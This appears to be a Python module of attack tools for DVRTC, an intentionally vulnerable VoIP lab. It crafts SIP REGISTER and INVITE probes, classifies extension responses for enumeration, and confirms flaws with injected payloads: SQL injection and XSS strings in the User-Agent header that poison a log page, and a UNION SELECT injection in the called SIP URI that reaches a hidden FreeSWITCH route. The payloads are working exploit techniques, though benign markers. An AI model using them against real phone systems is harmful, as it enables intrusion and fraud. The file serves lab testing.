from __future__ import annotations

from collections.abc import Iterator, Sequence
from contextlib import closing, contextmanager
from dataclasses import dataclass
import ipaddress
import json
import random
import re
import socket
import time
import urllib.error
import urllib.request
from typing import Callable


DEFAULT_SIP_PORT = 5060
HTTP_USER_AGENT = "dvrtc-attack-tools/1.0"
SIP_STATUS_RE = re.compile(r"^SIP/2.0\s+(\d{3})")
FREESWITCH_LUA_SQLI_EXTENSION = "2001"
FREESWITCH_LUA_SQLI_USER_AGENT = "DVRTC-Lua-SQLi-Benign"
DEFAULT_SQLI_PAYLOAD_TEMPLATE = "leak'), ((SELECT '{token}'))-- "
DEFAULT_XSS_PAYLOAD_TEMPLATE = '<img src=x onerror=alert("{token}")>'


@dataclass(frozen=True)
class SipDialog:
    call_id: str
    from_tag: str
    branch: str

    @classmethod
    def create(cls) -> SipDialog:
        return cls(
            call_id=f"dvrtc-{random.randint(100000, 999999)}@checks.local",
            from_tag=f"chk-{random.randint(100000, 999999)}",
            branch=f"z9hG4bK-{random.randint(100000, 999999)}",
        )


@dataclass(frozen=True)
class SipResponse:
    code: int
    headers: dict[str, str]
    body: str = ""


@dataclass
class SipSession:
    host: str
    sockaddr: tuple
    sock: socket.socket
    local_ip: str
    local_port: int

    def send(self, payload: str) -> None:
        self.sock.sendto(payload.encode("utf-8"), self.sockaddr)

    def send_register(
        self,
        extension: str,
        user_agent: str,
        *,
        cseq: int,
        dialog: SipDialog | None = None,
    ) -> SipDialog:
        dialog = dialog or SipDialog.create()
        self.send(
            build_register(
                self.host,
                extension,
                self.local_ip,
                self.local_port,
                user_agent,
                cseq=cseq,
                dialog=dialog,
            )
        )
        return dialog

    def send_invite(
        self,
        extension: str,
        user_agent: str,
        *,
        dialog: SipDialog | None = None,
    ) -> SipDialog:
        dialog = dialog or SipDialog.create()
        self.send(
            build_invite(
                self.host,
                extension,
                self.local_ip,
                self.local_port,
                user_agent,
                dialog=dialog,
            )
        )
        return dialog

    def collect(
        self,
        response_window: float,
        *,
        stop_when: Callable[[SipResponse, Sequence[SipResponse]], bool] | None = None,
    ) -> list[SipResponse]:
        return collect_sip_messages(self.sock, response_window, stop_when=stop_when)


def info(message: str) -> None:
    print(message, flush=True)


def fail(message: str) -> int:
    print(f"[!] {message}", flush=True)
    return 1


def normalize_host(host: str) -> str:
    if host.startswith("[") and host.endswith("]"):
        return host[1:-1]
    return host


def is_ipv6_literal(host: str) -> bool:
    try:
        return ipaddress.ip_address(normalize_host(host)).version == 6
    except ValueError:
        return False


def format_uri_host(host: str) -> str:
    normalized = normalize_host(host)
    if is_ipv6_literal(normalized):
        return f"[{normalized}]"
    return normalized


def format_hostport(host: str, port: int) -> str:
    return f"{format_uri_host(host)}:{port}"


def http_url(host: str, path: str) -> str:
    return f"http://{format_uri_host(host)}{path}"


def resolve_target(host: str, port: int, socktype: int) -> tuple[int, int, int, tuple]:
    infos = socket.getaddrinfo(normalize_host(host), port, type=socktype)
    if not infos:
        raise OSError(f"could not resolve {host}:{port}")
    addr_family, resolved_type, proto, _, sockaddr = infos[0]
    return addr_family, resolved_type, proto, sockaddr


def bind_addr_for_family(family: int, port: int = 0) -> tuple:
    if family == socket.AF_INET6:
        return ("::", port, 0, 0)
    return ("0.0.0.0", port)


def local_ip_for_target(host: str, port: int = DEFAULT_SIP_PORT) -> str:
    infos = socket.getaddrinfo(normalize_host(host), port, type=socket.SOCK_DGRAM)
    if not infos:
        return "127.0.0.1"

    primary_family = infos[0][0]
    addr_family, _, proto, _, sockaddr = infos[0]
    with closing(socket.socket(addr_family, socket.SOCK_DGRAM, proto)) as probe:
        try:
            probe.connect(sockaddr)
            ip = probe.getsockname()[0]
            if ip and ip != "0.0.0.0":
                return ip
        except OSError:
            pass

    if primary_family == socket.AF_INET6:
        fallback_target = ("2606:4700::1", 80, 0, 0)
    else:
        fallback_target = ("8.8.8.8", 80)

    with closing(socket.socket(primary_family, socket.SOCK_DGRAM)) as probe:
        try:
            probe.connect(fallback_target)
            ip = probe.getsockname()[0]
            if ip:
                return ip
        except OSError:
            pass

    return "::1" if primary_family == socket.AF_INET6 else "127.0.0.1"


def http_get_text(url: str, timeout: float = 5.0) -> tuple[int, str]:
    request = urllib.request.Request(url, headers={"User-Agent": HTTP_USER_AGENT})
    with urllib.request.urlopen(request, timeout=timeout) as response:
        body = response.read().decode("utf-8", errors="replace")
        return response.getcode(), body


def build_register(
    target_host: str,
    extension: str,
    local_ip: str,
    local_port: int,
    user_agent: str,
    *,
    cseq: int,
    dialog: SipDialog,
) -> str:
    target_uri_host = format_uri_host(target_host)
    local_hostport = format_hostport(local_ip, local_port)
    lines = [
        f"REGISTER sip:{target_uri_host} SIP/2.0",
        f"Via: SIP/2.0/UDP {local_hostport};branch={dialog.branch};rport",
        "Max-Forwards: 70",
        f"To: <sip:{extension}@{target_uri_host}>",
        f"From: <sip:{extension}@{target_uri_host}>;tag={dialog.from_tag}",
        f"Call-ID: {dialog.call_id}",
        f"CSeq: {cseq} REGISTER",
        f"Contact: <sip:{extension}@{local_hostport}>",
        "Expires: 60",
        f"User-Agent: {user_agent}",
        "Content-Length: 0",
        "",
        "",
    ]
    return "\r\n".join(lines)


def build_invite(
    target_host: str,
    extension: str,
    local_ip: str,
    local_port: int,
    user_agent: str,
    *,
    dialog: SipDialog,
) -> str:
    target_uri_host = format_uri_host(target_host)
    local_hostport = format_hostport(local_ip, local_port)
    addr_type = "IP6" if is_ipv6_literal(local_ip) else "IP4"
    media_port = local_port + 1000
    sdp = "\r\n".join(
        [
            "v=0",
            (
                f"o=- {random.randint(1000000, 9999999)} "
                f"{random.randint(1000000, 9999999)} IN {addr_type} {local_ip}"
            ),
            "s=DVRTC INVITE enumeration probe",
            f"c=IN {addr_type} {local_ip}",
            "t=0 0",
            f"m=audio {media_port} RTP/AVP 0 8",
            "a=rtpmap:0 PCMU/8000",
            "a=rtpmap:8 PCMA/8000",
            "a=sendrecv",
            "",
        ]
    )
    lines = [
        f"INVITE sip:{extension}@{target_uri_host} SIP/2.0",
        f"Via: SIP/2.0/UDP {local_hostport};branch={dialog.branch};rport",
        "Max-Forwards: 70",
        f"To: <sip:{extension}@{target_uri_host}>",
        f"From: <sip:probe@{target_uri_host}>;tag={dialog.from_tag}",
        f"Call-ID: {dialog.call_id}",
        "CSeq: 1 INVITE",
        f"Contact: <sip:probe@{local_hostport}>",
        f"User-Agent: {user_agent}",
        "Content-Type: application/sdp",
        f"Content-Length: {len(sdp)}",
        "",
        sdp,
    ]
    return "\r\n".join(lines)


def parse_sip_message(data: bytes) -> SipResponse:
    text = data.decode("utf-8", errors="ignore")
    header_text, _, body = text.partition("\r\n\r\n")
    lines = header_text.split("\r\n")
    first_line = lines[0] if lines else ""
    match = SIP_STATUS_RE.match(first_line)
    code = int(match.group(1)) if match else 0

    headers: dict[str, str] = {}
    for line in lines[1:]:
        if not line:
            break
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        headers[key.strip().lower()] = value.strip()

    return SipResponse(code=code, headers=headers, body=body)


def collect_sip_messages(
    sock: socket.socket,
    response_window: float,
    *,
    stop_when: Callable[[SipResponse, Sequence[SipResponse]], bool] | None = None,
) -> list[SipResponse]:
    messages: list[SipResponse] = []
    sock.settimeout(0.2)
    deadline = time.time() + response_window
    while time.time() < deadline:
        try:
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            continue
        response = parse_sip_message(data)
        if response.code:
            messages.append(response)
            if stop_when is not None and stop_when(response, messages):
                break
    return messages


@contextmanager
def open_sip_session(
    host: str,
    port: int = DEFAULT_SIP_PORT,
) -> Iterator[SipSession]:
    addr_family, socktype, proto, sockaddr = resolve_target(host, port, socket.SOCK_DGRAM)
    with closing(socket.socket(addr_family, socktype, proto)) as sock:
        sock.bind(bind_addr_for_family(addr_family))
        bound_local_port = sock.getsockname()[1]
        yield SipSession(
            host=host,
            sockaddr=sockaddr,
            sock=sock,
            local_ip=local_ip_for_target(host, port),
            local_port=bound_local_port,
        )


def is_final_invite_response(response: SipResponse, _responses: Sequence[SipResponse]) -> bool:
    return response.code >= 200


def probe_register(
    host: str,
    extension: str,
    user_agent: str,
    response_window: float = 2.0,
    *,
    stop_when: Callable[[SipResponse, Sequence[SipResponse]], bool] | None = None,
) -> list[SipResponse]:
    with open_sip_session(host) as session:
        session.send_register(extension, user_agent, cseq=1)
        return session.collect(response_window, stop_when=stop_when)


def probe_invite(
    host: str,
    extension: str,
    user_agent: str,
    response_window: float = 3.0,
) -> list[SipResponse]:
    with open_sip_session(host) as session:
        session.send_invite(extension, user_agent)
        return session.collect(response_window, stop_when=is_final_invite_response)


def poll_useragents_for_token(host: str, token: str, timeout: float = 15.0) -> bool:
    url = http_url(host, "/logs/useragents/useragents.json")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            status_code, body = http_get_text(url, timeout=3.0)
            if status_code == 200:
                data = json.loads(body)
                if isinstance(data, list):
                    for item in data:
                        if isinstance(item, dict) and token in str(item.get("useragent", "")):
                            return True
        except (json.JSONDecodeError, urllib.error.URLError, TimeoutError):
            pass
        time.sleep(0.8)
    return False


def sip_codes(responses: Sequence[SipResponse]) -> list[int]:
    return [response.code for response in responses]


def final_sip_response(responses: Sequence[SipResponse]) -> SipResponse | None:
    for response in reversed(responses):
        if response.code >= 200:
            return response
    return None


def response_has_sdp(response: SipResponse) -> bool:
    content_type = response.headers.get("content-type", "").lower()
    return "application/sdp" in content_type or response.body.startswith("v=0")


def classify_invite_responses(responses: Sequence[SipResponse]) -> tuple[str, str]:
    if not responses:
        return "no-response", "no SIP response received"

    final_response = final_sip_response(responses)
    if final_response is None:
        return "no-final", "no final SIP response received"

    reason = final_response.headers.get("reason", "")
    normalized_reason = reason.upper()
    saw_183_with_sdp = any(
        response.code == 183 and response_has_sdp(response)
        for response in responses
    )

    if final_response.code == 200:
        detail = "200 OK"
        if response_has_sdp(final_response):
            detail += " with SDP"
        return "routable", detail

    if final_response.code == 480 and "USER_NOT_REGISTERED" in normalized_reason:
        return "known-unregistered", reason

    if final_response.code == 480 and "NORMAL_CLEARING" in normalized_reason:
        return "invalid", reason

    if final_response.code in {404, 484, 604}:
        return "invalid", f"final {final_response.code}"

    if final_response.code == 480 and saw_183_with_sdp:
        return "invalid", reason or "183 Session Progress with SDP before 480"

    return "ambiguous", reason or f"final {final_response.code}"


def run_log_injection_check(
    host: str,
    extension: str,
    token: str,
    payload: str,
    label: str,
    timeout: float,
) -> int:
    info(f"[*] {label} check: sending malicious User-Agent payload")
    responses = probe_register(host, extension, payload)
    codes = sip_codes(responses)
    if not codes:
        return fail(f"{label} check failed: no SIP response to REGISTER injection probe")
    info(f"    [*] SIP response codes observed: {sorted(set(codes))}")

    info(f"[*] {label} check: polling logs JSON for payload token")
    if not poll_useragents_for_token(host, token, timeout=timeout):
        return fail(f"{label} token not found in useragents.json")
    info(f"[+] {label} vulnerability confirmed (token {token} observed)")
    return 0


def _render_payload_template(template: str, token: str) -> str | None:
    if "{token}" not in template:
        return None
    return template.format(token=token)


def run_sqli_check(
    host: str,
    extension: str = "1000",
    timeout: float = 15.0,
    *,
    token: str = "",
    payload_template: str = DEFAULT_SQLI_PAYLOAD_TEMPLATE,
) -> int:
    token_value = token or f"DVRTC_SQLI_{random.randint(100000, 999999)}"
    payload = _render_payload_template(payload_template, token_value)
    if payload is None:
        return fail("SQLi payload template must include '{token}'")
    return run_log_injection_check(host, extension, token_value, payload, "SQLi", timeout)


def run_xss_check(
    host: str,
    extension: str = "1000",
    timeout: float = 15.0,
    *,
    token: str = "",
    payload_template: str = DEFAULT_XSS_PAYLOAD_TEMPLATE,
) -> int:
    token_value = token or f"DVRTC_XSS_{random.randint(100000, 999999)}"
    payload = _render_payload_template(payload_template, token_value)
    if payload is None:
        return fail("XSS payload template must include '{token}'")
    return run_log_injection_check(host, extension, token_value, payload, "XSS", timeout)


def build_freeswitch_lua_sqli_injected_extension(
    extension: str,
    target_did: str,
    *,
    query_did: str = "",
    injected_extension: str = "",
) -> str:
    if injected_extension:
        return injected_extension
    queried_did = query_did or target_did
    return (
        f"{extension}'/**/AND/**/0/**/UNION/**/SELECT/**/target,scope"
        f"/**/FROM/**/did_routes/**/WHERE/**/did='{queried_did}"
    )


def run_freeswitch_lua_sqli_check(
    host: str,
    extension: str = FREESWITCH_LUA_SQLI_EXTENSION,
    *,
    target_did: str = "9000",
    query_did: str = "",
    injected_extension: str = "",
    expected_early_media_code: int = 183,
    response_window: float = 4.0,
) -> int:
    user_agent = FREESWITCH_LUA_SQLI_USER_AGENT
    queried_did = query_did or target_did
    injected_extension_value = build_freeswitch_lua_sqli_injected_extension(
        extension,
        target_did,
        query_did=query_did,
        injected_extension=injected_extension,
    )

    info(f"[*] FreeSWITCH Lua SQLi check: probing hidden target DID {queried_did} directly")
    hidden_responses = probe_invite(host, queried_did, user_agent, response_window)
    hidden_classification, hidden_detail = classify_invite_responses(hidden_responses)
    hidden_final = final_sip_response(hidden_responses)
    info(
        f"    [*] direct hidden target classification: {hidden_classification} "
        f"({hidden_detail})"
    )
    if hidden_final is not None and hidden_final.code == 200:
        return fail(
            "FreeSWITCH Lua SQLi check failed: hidden target DID is directly reachable without SQLi"
        )

    info(
        f"[*] FreeSWITCH Lua SQLi check: probing extension {extension} "
        f"with a normal called URI"
    )
    benign_responses = probe_invite(host, extension, user_agent, response_window)
    benign_classification, benign_detail = classify_invite_responses(benign_responses)
    benign_codes = sip_codes(benign_responses)
    info(
        f"    [*] benign path classification: {benign_classification} "
        f"({benign_detail})"
    )
    if benign_classification != "routable":
        return fail(
            "FreeSWITCH Lua SQLi check failed: benign INVITE should reach the normal service"
        )
    if expected_early_media_code in benign_codes:
        return fail(
            "FreeSWITCH Lua SQLi check failed: benign INVITE already exposes the hidden HAL early-media pattern"
        )

    info(f"[*] FreeSWITCH Lua SQLi check: sending injected called URI {injected_extension_value}")
    injected_responses = probe_invite(host, injected_extension_value, user_agent, response_window)
    injected_classification, injected_detail = classify_invite_responses(injected_responses)
    injected_final = final_sip_response(injected_responses)
    injected_code = injected_final.code if injected_final is not None else 0
    saw_expected_early_media = any(
        response.code == expected_early_media_code and response_has_sdp(response)
        for response in injected_responses
    )
    info(
        f"    [*] injected path classification: {injected_classification} "
        f"({injected_detail}); final={injected_code}; early-media={'yes' if saw_expected_early_media else 'no'}"
    )

    if injected_code != 200:
        return fail(
            "FreeSWITCH Lua SQLi check failed: injected INVITE did not answer the hidden service"
        )
    if not saw_expected_early_media:
        return fail(
            "FreeSWITCH Lua SQLi check failed: injected INVITE did not expose the expected "
            f"hidden HAL early-media pattern ({expected_early_media_code} with SDP)"
        )

    info(
        f"[+] FreeSWITCH Lua SQL injection confirmed via called SIP URI "
        f"(hidden DID mapping for {queried_did}, early media {expected_early_media_code})"
    )
    return 0
